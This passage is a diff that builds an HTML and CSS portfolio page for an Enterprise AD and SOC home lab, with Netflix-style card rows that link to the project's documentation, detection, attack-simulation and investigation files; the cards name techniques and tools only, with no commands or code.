@@ -1,8 +1,290 @@
-.card {
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Enterprise AD + SOC Lab | Netflix-Style Dashboard</title>
+  <style>
+    :root {
+      --bg: #050b14;
+      --bg-2: #0a1221;
+      --panel: #0f1a2d;
+      --panel-2: #121f36;
+      --line: rgba(168, 198, 255, 0.14);
+      --text: #f4f8ff;
+      --muted: #9eb0cf;
+      --accent: #77adff;
+      --accent-2: #b3d0ff;
+      --shadow: 0 18px 45px rgba(0, 0, 0, 0.42);
+      --max: 1360px;
+      --radius: 24px;
+    }
+
+    * { box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      margin: 0;
+      font-family: Inter, Segoe UI, Roboto, Arial, sans-serif;
+      color: var(--text);
+      background:
+        radial-gradient(circle at top left, rgba(57, 104, 193, 0.22), transparent 24%),
+        radial-gradient(circle at top right, rgba(84, 131, 228, 0.14), transparent 20%),
+        linear-gradient(180deg, #040912 0%, #06101d 24%, #071221 100%);
+      overflow-x: hidden;
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      opacity: 0.22;
+      background-image:
+        linear-gradient(rgba(255,255,255,0.025) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255,255,255,0.025) 1px, transparent 1px);
+      background-size: 42px 42px;
+    }
+
+    .container {
+      width: min(var(--max), calc(100% - 36px));
+      margin: 0 auto;
+      position: relative;
+      z-index: 1;
+    }
+
+    .nav {
+      position: sticky;
+      top: 0;
+      z-index: 50;
+      backdrop-filter: blur(16px);
+      background: linear-gradient(180deg, rgba(4,10,18,0.88), rgba(4,10,18,0.58));
+      border-bottom: 1px solid rgba(255,255,255,0.06);
+    }
+
+    .nav-inner {
+      width: min(var(--max), calc(100% - 36px));
+      margin: 0 auto;
+      padding: 14px 0;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 18px;
+    }
+
+    .brand-wrap {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      min-width: 0;
+    }
+
+    .brand-badge {
+      width: 40px;
+      height: 40px;
+      border-radius: 12px;
+      display: grid;
+      place-items: center;
+      background: linear-gradient(180deg, rgba(121, 173, 255, 0.24), rgba(66, 97, 159, 0.2));
+      border: 1px solid rgba(170, 202, 255, 0.16);
+      box-shadow: var(--shadow);
+      font-weight: 800;
+      color: var(--accent-2);
+    }
+
+    .brand-title {
+      font-weight: 800;
+      letter-spacing: 0.01em;
+      white-space: nowrap;
+    }
+
+    .brand-sub {
+      color: var(--muted);
+      font-size: 0.84rem;
+      margin-top: 2px;
+    }
+
+    .nav-links {
+      display: flex;
+      gap: 16px;
+      flex-wrap: wrap;
+      justify-content: flex-end;
+    }
+
+    .nav-links a {
+      color: var(--muted);
+      text-decoration: none;
+      font-size: 0.94rem;
+    }
+
+    .nav-links a:hover { color: var(--text); }
+
+    .hero {
+      min-height: 88vh;
+      display: flex;
+      align-items: end;
+      position: relative;
+      overflow: hidden;
+      background:
+        linear-gradient(90deg, rgba(4,10,18,0.95) 0%, rgba(5,10,18,0.8) 38%, rgba(5,10,18,0.34) 66%, rgba(5,10,18,0.18) 100%),
+        radial-gradient(circle at 78% 35%, rgba(89, 139, 230, 0.24), transparent 22%),
+        linear-gradient(180deg, #081221 0%, #0a1628 100%);
+    }
+
+    .hero::after {
+      content: "";
+      position: absolute;
+      right: -8%;
+      top: 4%;
+      width: 54%;
+      height: 82%;
+      border-radius: 36px;
+      background:
+        linear-gradient(180deg, rgba(125,172,255,0.08), rgba(8,14,24,0.24)),
+        radial-gradient(circle at 40% 20%, rgba(124,172,255,0.24), transparent 28%),
+        rgba(255,255,255,0.02);
+      border: 1px solid rgba(163, 198, 255, 0.12);
+      box-shadow: var(--shadow);
+      transform: perspective(1200px) rotateY(-12deg);
+    }
+
+    .hero-content {
+      position: relative;
+      z-index: 2;
+      width: min(760px, 100%);
+      padding: 88px 0 90px;
+    }
+
+    .eyebrow {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      padding: 8px 14px;
+      border-radius: 999px;
+      font-size: 0.88rem;
+      color: var(--accent-2);
+      background: rgba(118, 167, 255, 0.08);
+      border: 1px solid rgba(168, 198, 255, 0.14);
+      margin-bottom: 18px;
+    }
+
+    h1 {
+      margin: 0;
+      font-size: clamp(2.4rem, 6vw, 5.4rem);
+      line-height: 0.98;
+      letter-spacing: -0.045em;
+      max-width: 11ch;
+    }
+
+    .hero p {
+      max-width: 64ch;
+      line-height: 1.75;
+      color: var(--muted);
+      font-size: 1.02rem;
+      margin: 18px 0 26px;
+    }
+
+    .cta-row {
+      display: flex;
+      gap: 14px;
+      flex-wrap: wrap;
+      margin-bottom: 24px;
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      padding: 14px 20px;
+      border-radius: 14px;
+      text-decoration: none;
+      font-weight: 700;
+      border: 1px solid rgba(170, 202, 255, 0.14);
+      transition: transform 0.2s ease, box-shadow 0.2s ease, border-color 0.2s ease;
+    }
+
+    .btn:hover {
+      transform: translateY(-2px);
+      border-color: rgba(170, 202, 255, 0.3);
+      box-shadow: var(--shadow);
+    }
+
+    .btn-primary {
+      background: linear-gradient(180deg, rgba(121, 173, 255, 0.25), rgba(77, 118, 194, 0.18));
+      color: var(--text);
+    }
+
+    .btn-secondary {
+      background: rgba(255,255,255,0.035);
+      color: var(--text);
+    }
+
+    .hero-stats {
+      display: flex;
+      gap: 24px;
+      flex-wrap: wrap;
+      color: var(--muted);
+      font-size: 0.94rem;
+    }
+
+    .hero-stats strong {
+      display: block;
+      color: var(--text);
+      font-size: 1.28rem;
+      margin-bottom: 4px;
+    }
+
+    section {
+      padding: 28px 0;
+    }
+
+    .section-head {
+      display: flex;
+      justify-content: space-between;
+      align-items: end;
+      gap: 18px;
+      margin-bottom: 16px;
+    }
+
+    .section-head h2 {
+      margin: 0;
+      font-size: clamp(1.3rem, 2.4vw, 2rem);
+      letter-spacing: -0.03em;
+    }
+
+    .section-head p {
+      margin: 0;
+      color: var(--muted);
+      max-width: 60ch;
+      line-height: 1.65;
+    }
+
+    .row-wrap {
+      position: relative;
+    }
+
+    .scroller {
+      display: grid;
+      grid-auto-flow: column;
+      grid-auto-columns: minmax(280px, 340px);
+      gap: 18px;
+      overflow-x: auto;
+      padding-bottom: 12px;
+      scroll-snap-type: x proximity;
+      scrollbar-width: thin;
+    }
+
+    .scroller::-webkit-scrollbar { height: 10px; }
+    .scroller::-webkit-scrollbar-thumb {
+      background: rgba(153, 190, 255, 0.16);
+      border-radius: 999px;
+    }
+
+    .card {
   position: relative;
   min-height: 220px;
   border-radius: var(--radius);
-  overflow: visible;
+  overflow: hidden;
   border: 1px solid rgba(168, 198, 255, 0.12);
   background:
     linear-gradient(180deg, rgba(17, 28, 48, 0.78), rgba(9, 16, 28, 0.96)),
@@ -11,6 +293,12 @@
   scroll-snap-align: start;
   transition: transform 0.28s ease, border-color 0.28s ease, box-shadow 0.28s ease;
   isolation: isolate;
+  cursor: pointer;
+  width: 100%;
+  text-align: left;
+  font: inherit;
+  color: inherit;
+  appearance: none;
 }
 
 .card:hover {
@@ -20,35 +308,194 @@
   z-index: 10;
 }
 
-.hover-panel {
-  position: absolute;
-  left: 0;
-  right: 0;
-  top: calc(100% + 10px);
-  z-index: 20;
-  padding: 18px;
-  border-radius: 18px;
-  background: linear-gradient(180deg, rgba(10, 18, 31, 0.98), rgba(7, 12, 22, 0.99));
-  border: 1px solid rgba(168, 198, 255, 0.16);
-  box-shadow: 0 20px 45px rgba(0,0,0,0.5);
-  transform: translateY(-6px);
-  opacity: 0;
-  visibility: hidden;
-  transition: transform 0.24s ease, opacity 0.22s ease, visibility 0.22s ease;
-  min-height: 140px;
+    .card-media {
+      height: 140px;
+      background:
+        linear-gradient(180deg, rgba(6, 10, 18, 0.08), rgba(6, 10, 18, 0.45)),
+        radial-gradient(circle at 20% 15%, rgba(124, 172, 255, 0.28), transparent 26%),
+        linear-gradient(135deg, #16223a, #0b1220);
+      position: relative;
+    }
+
+    .card-media::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
+      background-size: 24px 24px;
+      opacity: 0.3;
+    }
+
+    .play {
+      position: absolute;
+      left: 18px;
+      top: 18px;
+      width: 54px;
+      height: 54px;
+      border-radius: 50%;
+      display: grid;
+      place-items: center;
+      background: rgba(248, 251, 255, 0.92);
+      color: #08101b;
+      font-size: 1.2rem;
+      font-weight: 800;
+      z-index: 2;
+    }
+
+    .card-body {
+  position: relative;
+  z-index: 2;
+  padding: 16px 18px 18px 18px;
+  min-height: 220px;
+  display: flex;
+  flex-direction: column;
+  justify-content: flex-start;
 }
 
-.card:hover .hover-panel,
-.card:focus-within .hover-panel {
-  transform: translateY(0);
+    .meta {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+      margin-bottom: 10px;
+    }
+
+    .pill {
+      display: inline-flex;
+      padding: 6px 10px;
+      border-radius: 999px;
+      font-size: 0.74rem;
+      color: var(--accent-2);
+      background: rgba(118, 167, 255, 0.08);
+      border: 1px solid rgba(168, 198, 255, 0.12);
+    }
+
+    .card h3 {
+      margin: 0 0 8px;
+      font-size: 1.14rem;
+    }
+
+    .card p {
+  margin: 0;
+  max-width: 28ch;
+      color: var(--muted);
+      line-height: 1.65;
+      font-size: 0.95rem;
+    }
+
+    .modal {
+  position: fixed;
+  inset: 0;
+  z-index: 120;
+  display: grid;
+  place-items: center;
+  padding: 24px;
+  opacity: 0;
+  visibility: hidden;
+  transition: opacity 0.24s ease, visibility 0.24s ease;
+}
+
+.modal.is-open {
   opacity: 1;
   visibility: visible;
 }
 
-@media (hover: none) {
-  .card {
-    overflow: hidden;
+.modal-backdrop {
+  position: absolute;
+  inset: 0;
+  background: rgba(3, 7, 14, 0.76);
+  backdrop-filter: blur(8px);
+}
+
+.modal-dialog {
+  position: relative;
+  z-index: 2;
+  width: min(780px, calc(100vw - 32px));
+  max-height: min(86vh, 900px);
+  overflow: auto;
+  border-radius: 26px;
+  border: 1px solid rgba(168, 198, 255, 0.16);
+  background: linear-gradient(180deg, rgba(13, 23, 40, 0.98), rgba(7, 12, 22, 0.99));
+  box-shadow: 0 28px 70px rgba(0,0,0,0.55);
+}
+
+.modal-hero {
+  height: 220px;
+  background:
+    linear-gradient(180deg, rgba(6, 10, 18, 0.12), rgba(6, 10, 18, 0.52)),
+    radial-gradient(circle at 20% 15%, rgba(124, 172, 255, 0.28), transparent 26%),
+    linear-gradient(135deg, #16223a, #0b1220);
+}
+
+.modal-content {
+  padding: 24px;
+}
+
+.modal-meta {
+  display: flex;
+  gap: 10px;
+  flex-wrap: wrap;
+  margin-bottom: 14px;
+}
+
+.modal-content h3 {
+  margin: 0 0 12px;
+  font-size: clamp(1.6rem, 3vw, 2.4rem);
+}
+
+.modal-description {
+  margin: 0 0 20px;
+  color: var(--muted);
+  line-height: 1.8;
+}
+
+.modal-section h4 {
+  margin: 0 0 10px;
+  font-size: 1rem;
+  color: var(--accent-2);
+}
+
+.modal-section ul {
+  margin: 0;
+  padding-left: 20px;
+  color: var(--muted);
+  line-height: 1.8;
+}
+
+.modal-close {
+  position: absolute;
+  top: 14px;
+  right: 14px;
+  z-index: 3;
+  width: 42px;
+  height: 42px;
+  border: 0;
+  border-radius: 50%;
+  background: rgba(10, 18, 31, 0.72);
+  color: #fff;
+  font-size: 1.6rem;
+  cursor: pointer;
+}
+
+.modal-close:hover {
+  background: rgba(18, 30, 52, 0.92);
+}
+
+@media (max-width: 760px) {
+  .modal {
+    padding: 12px;
   }
+
+  .modal-dialog {
+    width: calc(100vw - 16px);
+    max-height: 90vh;
+  }
+
+  .modal-hero {
+    height: 170px;
+  }
+}
 
   .hover-panel {
     position: static;
@@ -66,3 +513,462 @@
     min-height: 0;
   }
 }
+
+  .card-body {
+    min-height: 0;
+  }
+}
+
+@media (max-width: 760px) {
+      .nav-inner, .section-head { display: block; }
+      .nav-links { margin-top: 12px; justify-content: flex-start; }
+      .hero { min-height: auto; }
+      .hero-content { padding: 52px 0 54px; }
+      .hero::after { display: none; }
+      .highlight-grid, .gallery { grid-template-columns: 1fr; }
+      .scroller { grid-auto-columns: minmax(260px, 86vw); }
+    }
+  </style>
+</head>
+<body>
+  <nav class="nav">
+    <div class="nav-inner">
+      <div class="brand-wrap">
+        <div class="brand-badge">SOC</div>
+        <div>
+          <div class="brand-title">Enterprise AD + SOC Lab</div>
+          <div class="brand-sub">Repository-driven Netflix-style SOC portfolio</div>
+        </div>
+      </div>
+      <div class="nav-links">
+        <a href="#docs">Docs</a>
+        <a href="#architecture">Architecture</a>
+        <a href="#infrastructure">Infrastructure</a>
+        <a href="#detections">Detections</a>
+        <a href="#simulations">Simulations</a>
+        <a href="#investigations">Investigations</a>
+        <a href="#reports">Reports</a>
+        <a href="#evidence">Evidence</a>
+      </div>
+    </div>
+  </nav>
+
+  <header class="hero">
+    <div class="container">
+      <div class="hero-content">
+        <span class="eyebrow">Now Streaming: Enterprise AD • Detection Engineering • SOC Operations • Repository Walkthrough</span>
+        <h1>Enterprise AD + SOC Lab Repository Experience</h1>
+        <p>
+          A cinematic cybersecurity portfolio built around your real repository structure. This version turns the project into a Netflix-style browsing experience for docs, architecture, infrastructure build notes, detections, simulations, investigations, and SOC reporting using Wazuh, Security Onion, Sysmon, Suricata, Zeek, Kali, Linux, and Active Directory.
+        </p>
+        <div class="cta-row">
+          <a class="btn btn-primary" href="#simulations">▶ Browse Simulations</a>
+          <a class="btn btn-secondary" href="#docs">Open Repository Walkthrough</a>
+        </div>
+        <div class="hero-stats">
+          <div><strong>07</strong>repository lanes</div>
+          <div><strong>15+</strong>core project files</div>
+          <div><strong>06</strong>SOC content tracks</div>
+          <div><strong>Berlin</strong>junior SOC target roles</div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <section id="docs">
+    <div class="container">
+      <div class="section-head">
+        <h2>Docs</h2>
+        <p>This first row mirrors your documentation folder so a recruiter can browse the project scope, lab inventory, architecture, threat model, execution checklist, and analyst walkthrough like episodes.</p>
+      </div>
+      <div class="row-wrap">
+        <div class="scroller">
+          <button class="card modal-card" data-title="Project Scope" data-subtitle="docs/00-project-scope.md" data-description="High-level mission, goals, tooling boundaries, and what the enterprise lab is meant to demonstrate." data-details="project purpose|learning objectives|recruiter-facing summary|enterprise SOC lab goals" data-labels="docs/,00-project-scope.md">
+            <div class="card-media"><div class="play">▶</div></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">docs/</span><span class="pill">00-project-scope.md</span></div>
+              <h3>Project Scope</h3>
+              <p>High-level mission, goals, tooling boundaries, and what the enterprise lab is meant to demonstrate.</p>
+            </div>
+          </button>
+          <button class="card modal-card" data-title="Lab Inventory" data-subtitle="docs/01-lab-inventory.md" data-description="VM list, host specs, network ranges, roles, sensors, and endpoint coverage in one quick view." data-details="shows planning depth|proves environment is real|great for interview explanation|supports architecture walkthrough" data-labels="docs/,01-lab-inventory.md">
+            <div class="card-media"><div class="play">▶</div></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">docs/</span><span class="pill">01-lab-inventory.md</span></div>
+              <h3>Lab Inventory</h3>
+              <p>VM list, host specs, network ranges, roles, sensors, and endpoint coverage in one quick view.</p>
+            </div>
+          </button>
+          <button class="card modal-card" data-title="Threat Model" data-subtitle="docs/04-threat-model.md" data-description="Adversary assumptions, attack paths, monitored assets, and priority detections mapped to your lab." data-details="shows security thinking|connects attacks to detections|supports ATT&CK mapping|explains monitoring priorities" data-labels="docs/,04-threat-model.md">
+            <div class="card-media"><div class="play">▶</div></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">docs/</span><span class="pill">04-threat-model.md</span></div>
+              <h3>Threat Model</h3>
+              <p>Adversary assumptions, attack paths, monitored assets, and priority detections mapped to your lab.</p>
+            </div>
+          </button>
+          <button class="card modal-card" data-title="SOC Analyst Walkthrough" data-subtitle="docs/06-soc-analyst-walkthrough.md" data-description="Step-by-step analyst narrative from detection to evidence review, triage, and incident reporting." data-details="alert workflow|investigation storyline|manager-friendly structure|ideal for recruiter demos" data-labels="docs/,06-soc-analyst-walkthrough.md">
+            <div class="card-media"><div class="play">▶</div></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">docs/</span><span class="pill">06-soc-analyst-walkthrough.md</span></div>
+              <h3>SOC Analyst Walkthrough</h3>
+              <p>Step-by-step analyst narrative from detection to evidence review, triage, and incident reporting.</p>
+            </div>
+          </button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="architecture">
+    <div class="container">
+      <div class="section-head">
+        <h2>Architecture</h2>
+        <p>This row maps directly to the architecture folder and is where you visually explain zones, system relationships, and diagrams.</p>
+      </div>
+      <div class="row-wrap">
+        <div class="scroller">
+          <button class="card modal-card" data-title="Architecture Overview" data-subtitle="architecture/00-overview.md" data-description="Executive view of the full lab and how the blue-team stack receives host and network telemetry." data-details="topology summary|log flow|trust boundaries|blue-team monitoring map" data-labels="architecture/,00-overview.md">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">architecture/</span><span class="pill">00-overview.md</span></div>
+              <h3>Architecture Overview</h3>
+              <p>Executive view of the full lab and how the blue-team stack receives host and network telemetry.</p>
+            </div>
+          </button>
+          <button class="card modal-card" data-title="Network Zones" data-subtitle="architecture/01-network-zones.md" data-description="Attacker segment, monitored servers, clients, IDS sensors, and management traffic broken into clean zones." data-details="zone diagram|IP ranges|traffic direction|segmentation logic" data-labels="architecture/,01-network-zones.md">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">architecture/</span><span class="pill">01-network-zones.md</span></div>
+              <h3>Network Zones</h3>
+              <p>Attacker segment, monitored servers, clients, IDS sensors, and management traffic broken into clean zones.</p>
+            </div>
+          </button>
+          <button class="card modal-card" data-title="System Relationships" data-subtitle="architecture/02-system-relationships.md" data-description="Domain controller, Windows client, Ubuntu, Kali, Security Onion, and Wazuh relationships in one path." data-details="infrastructure awareness|AD understanding|monitoring design|system dependency map" data-labels="architecture/,02-system-relationships.md">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">architecture/</span><span class="pill">02-system-relationships.md</span></div>
+              <h3>System Relationships</h3>
+              <p>Domain controller, Windows client, Ubuntu, Kali, Security Onion, and Wazuh relationships in one path.</p>
+            </div>
+          </button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="infrastructure">
+    <div class="container">
+      <div class="section-head">
+        <h2>Infrastructure Build</h2>
+        <p>This row turns your infrastructure folder into a bingeable build sequence from VM preparation through Wazuh and Docker.</p>
+      </div>
+      <div class="row-wrap">
+        <div class="scroller">
+          <button class="card modal-card" data-title="Build Order" data-subtitle="infrastructure/00-build-order.md" data-description="The full deployment sequence so the project looks repeatable and professionally planned." data-details="phase order|dependencies|bootstrapping logic|deployment sequence" data-labels="infrastructure/,00-build-order.md">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">infrastructure/</span><span class="pill">00-build-order.md</span></div>
+              <h3>Build Order</h3>
+              <p>The full deployment sequence so the project looks repeatable and professionally planned.</p>
+            </div>
+          </button>
+          <button class="card modal-card" data-title="Windows Server 2025" data-subtitle="infrastructure/03-windows-server-2025.md" data-description="Domain services, DNS, baseline configuration, and security context for the enterprise side of the lab." data-details="AD DS role|DNS setup|server baseline|enterprise server context" data-labels="infrastructure/,03-windows-server-2025.md">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">infrastructure/</span><span class="pill">03-windows-server-2025.md</span></div>
+              <h3>Windows Server 2025</h3>
+              <p>Domain services, DNS, baseline configuration, and security context for the enterprise side of the lab.</p>
+            </div>
+          </button>
+          <button class="card modal-card" data-title="Security Onion" data-subtitle="infrastructure/07-security-onion.md" data-description="IDS setup, sensor placement, hunting interface, and how network detections enter the analyst workflow." data-details="Suricata + Zeek|alert validation|sensor visibility|hunt workflow" data-labels="infrastructure/,07-security-onion.md">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">infrastructure/</span><span class="pill">07-security-onion.md</span></div>
+              <h3>Security Onion</h3>
+              <p>IDS setup, sensor placement, hunting interface, and how network detections enter the analyst workflow.</p>
+            </div>
+          </button>
+          <button class="card modal-card" data-title="Wazuh SIEM" data-subtitle="infrastructure/08-wazuh.md" data-description="Centralized detection, host log ingestion, and the main SOC alerting layer for your portfolio stories." data-details="agent coverage|alerting|SIEM dashboards|host telemetry ingestion" data-labels="infrastructure/,08-wazuh.md">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">infrastructure/</span><span class="pill">08-wazuh.md</span></div>
+              <h3>Wazuh SIEM</h3>
+              <p>Centralized detection, host log ingestion, and the main SOC alerting layer for your portfolio stories.</p>
+            </div>
+          </button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="detections">
+    <div class="container">
+      <div class="section-head">
+        <h2>Detections</h2>
+        <p>This row is aligned to the detections folder and is where the project starts to look like true detection engineering, not just a lab build.</p>
+      </div>
+      <div class="row-wrap">
+        <div class="scroller">
+          <button class="card modal-card" data-title="Detection Strategy" data-subtitle="detections/00-detection-strategy.md" data-description="Coverage goals, telemetry sources, ATT&CK priorities, and how the lab decides what to detect first." data-details="intentional design|links infra to detections|roadmap planning|coverage priorities" data-labels="detections/,00-detection-strategy.md">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">detections/</span><span class="pill">00-detection-strategy.md</span></div>
+              <h3>Detection Strategy</h3>
+              <p>Coverage goals, telemetry sources, ATT&amp;CK priorities, and how the lab decides what to detect first.</p>
+            </div>
+          </button>
+          <button class="card modal-card" data-title="Wazuh Rules" data-subtitle="detections/01-wazuh-rules.md" data-description="Custom host-based alerts for authentication anomalies, suspicious process execution, and lab-specific detection logic." data-details="rule IDs|alert screenshots|sample event payloads|host-based correlation" data-labels="detections/,01-wazuh-rules.md">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">detections/</span><span class="pill">01-wazuh-rules.md</span></div>
+              <h3>Wazuh Rules</h3>
+              <p>Custom host-based alerts for authentication anomalies, suspicious process execution, and lab-specific detection logic.</p>
+            </div>
+          </button>
+          <button class="card modal-card" data-title="Sysmon Coverage" data-subtitle="detections/02-sysmon.md" data-description="Windows telemetry strategy for process creation, network connections, and host activity needed for investigations." data-details="event IDs|config highlights|host evidence samples|Windows investigation support" data-labels="detections/,02-sysmon.md">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">detections/</span><span class="pill">02-sysmon.md</span></div>
+              <h3>Sysmon Coverage</h3>
+              <p>Windows telemetry strategy for process creation, network connections, and host activity needed for investigations.</p>
+            </div>
+          </button>
+          <button class="card modal-card" data-title="Security Onion Hunts" data-subtitle="detections/03-security-onion-hunts.md" data-description="Hunt workflows for network scans, suspicious traffic, and correlation between Suricata alerts and Zeek logs." data-details="hunt queries|alert triage flow|network pivots|IDS-to-hunt workflow" data-labels="detections/,03-security-onion-hunts.md">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">detections/</span><span class="pill">03-security-onion-hunts.md</span></div>
+              <h3>Security Onion Hunts</h3>
+              <p>Hunt workflows for network scans, suspicious traffic, and correlation between Suricata alerts and Zeek logs.</p>
+            </div>
+          </button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="simulations">
+    <div class="container">
+      <div class="section-head">
+        <h2>Simulations</h2>
+        <p>This is your attack-simulation row, aligned to the simulations folder and ideal for the cinematic Netflix feel.</p>
+      </div>
+      <div class="row-wrap">
+        <div class="scroller">
+          <button class="card modal-card" data-title="Reconnaissance" data-subtitle="simulations/01-reconnaissance.md" data-description="Nmap-style discovery, service probing, and the first signs of hostile awareness inside the lab." data-details="scan activity|Suricata / Zeek detections|T1046 mapping|good recruiter demo scenario" data-labels="simulations/,01-reconnaissance.md">
+            <div class="card-media"><div class="play">▶</div></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">simulations/</span><span class="pill">01-reconnaissance.md</span></div>
+              <h3>Reconnaissance</h3>
+              <p>Nmap-style discovery, service probing, and the first signs of hostile awareness inside the lab.</p>
+            </div>
+          </button>
+          <button class="card modal-card" data-title="Brute Force" data-subtitle="simulations/02-bruteforce.md" data-description="Linux SSH and Windows logon failure scenarios designed for strong SIEM evidence and analyst reports." data-details="Hydra attempts|auth.log evidence|Event ID 4625|strong case-building scenario" data-labels="simulations/,02-bruteforce.md">
+            <div class="card-media"><div class="play">▶</div></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">simulations/</span><span class="pill">02-bruteforce.md</span></div>
+              <h3>Brute Force</h3>
+              <p>Linux SSH and Windows logon failure scenarios designed for strong SIEM evidence and analyst reports.</p>
+            </div>
+          </button>
+          <button class="card modal-card" data-title="Lateral Movement" data-subtitle="simulations/03-lateral-movement.md" data-description="Remote execution style behavior that proves the lab can model post-compromise analyst thinking." data-details="PsExec or WMI|Sysmon process traces|T1021 mapping|post-compromise workflow" data-labels="simulations/,03-lateral-movement.md">
+            <div class="card-media"><div class="play">▶</div></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">simulations/</span><span class="pill">03-lateral-movement.md</span></div>
+              <h3>Lateral Movement</h3>
+              <p>Remote execution style behavior that proves the lab can model post-compromise analyst thinking.</p>
+            </div>
+          </button>
+          <button class="card modal-card" data-title="Privilege Escalation" data-subtitle="simulations/04-privilege-escalation.md" data-description="Linux or Windows privilege abuse scenarios tied to host telemetry and suspicious activity review." data-details="sudo misuse|elevated activity|T1068 mapping|host-based escalation evidence" data-labels="simulations/,04-privilege-escalation.md">
+            <div class="card-media"><div class="play">▶</div></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">simulations/</span><span class="pill">04-privilege-escalation.md</span></div>
+              <h3>Privilege Escalation</h3>
+              <p>Linux or Windows privilege abuse scenarios tied to host telemetry and suspicious activity review.</p>
+            </div>
+          </button>
+          <button class="card modal-card" data-title="Persistence" data-subtitle="simulations/05-persistence.md" data-description="Scheduled tasks, startup abuse, or account changes that demonstrate long-lived detection coverage." data-details="schtasks|new user creation|persistence artifacts|long-lived attacker behavior" data-labels="simulations/,05-persistence.md">
+            <div class="card-media"><div class="play">▶</div></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">simulations/</span><span class="pill">05-persistence.md</span></div>
+              <h3>Persistence</h3>
+              <p>Scheduled tasks, startup abuse, or account changes that demonstrate long-lived detection coverage.</p>
+            </div>
+          </button>
+          <button class="card modal-card" data-title="Linux Attacks" data-subtitle="simulations/06-linux-attacks.md" data-description="Linux-centric attack activity covering auth abuse, shell execution, privilege actions, and host log evidence." data-details="auth anomalies|shell commands|forensic log pivots|Linux analyst casework" data-labels="simulations/,06-linux-attacks.md">
+            <div class="card-media"><div class="play">▶</div></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">simulations/</span><span class="pill">06-linux-attacks.md</span></div>
+              <h3>Linux Attacks</h3>
+              <p>Linux-centric attack activity covering auth abuse, shell execution, privilege actions, and host log evidence.</p>
+            </div>
+          </button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="investigations">
+    <div class="container">
+      <div class="section-head">
+        <h2>Investigations</h2>
+        <p>These are your case files. Each card can later open a dedicated case page built from the investigations folder.</p>
+      </div>
+      <div class="row-wrap">
+        <div class="scroller">
+          <button class="card modal-card" data-title="Investigation Method" data-subtitle="investigations/00-investigation-method.md" data-description="The repeatable analyst process from alert validation through MITRE mapping and final incident summary." data-details="alert review|evidence validation|case documentation|MITRE-based reporting" data-labels="investigations/,00-investigation-method.md">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">investigations/</span><span class="pill">00-investigation-method.md</span></div>
+              <h3>Investigation Method</h3>
+              <p>The repeatable analyst process from alert validation through MITRE mapping and final incident summary.</p>
+            </div>
+          </button>
+          <button class="card modal-card" data-title="SSH Brute Force Case" data-subtitle="investigations/01-ssh-bruteforce-case.md" data-description="One of the strongest recruiter-facing investigations because it clearly shows logs, SIEM correlation, and conclusion." data-details="auth.log screenshot|Wazuh alert|T1110 mapping|case conclusion" data-labels="investigations/,01-ssh-bruteforce-case.md">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">investigations/</span><span class="pill">01-ssh-bruteforce-case.md</span></div>
+              <h3>SSH Brute Force Case</h3>
+              <p>One of the strongest recruiter-facing investigations because it clearly shows logs, SIEM correlation, and conclusion.</p>
+            </div>
+          </button>
+          <button class="card modal-card" data-title="Windows Logon Case" data-subtitle="investigations/02-windows-logon-case.md" data-description="Failed logon evidence from Windows Security logs, Sysmon coverage, and host context useful for SOC interviews." data-details="4625 evidence|user and host context|analyst notes|Windows triage workflow" data-labels="investigations/,02-windows-logon-case.md">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">investigations/</span><span class="pill">02-windows-logon-case.md</span></div>
+              <h3>Windows Logon Case</h3>
+              <p>Failed logon evidence from Windows Security logs, Sysmon coverage, and host context useful for SOC interviews.</p>
+            </div>
+          </button>
+          <button class="card modal-card" data-title="PowerShell Case" data-subtitle="investigations/03-powershell-case.md" data-description="Windows script execution style casework that makes the portfolio feel closer to real-world blue-team investigations." data-details="Sysmon process creation|command-line evidence|T1059 mapping|script execution investigation" data-labels="investigations/,03-powershell-case.md">
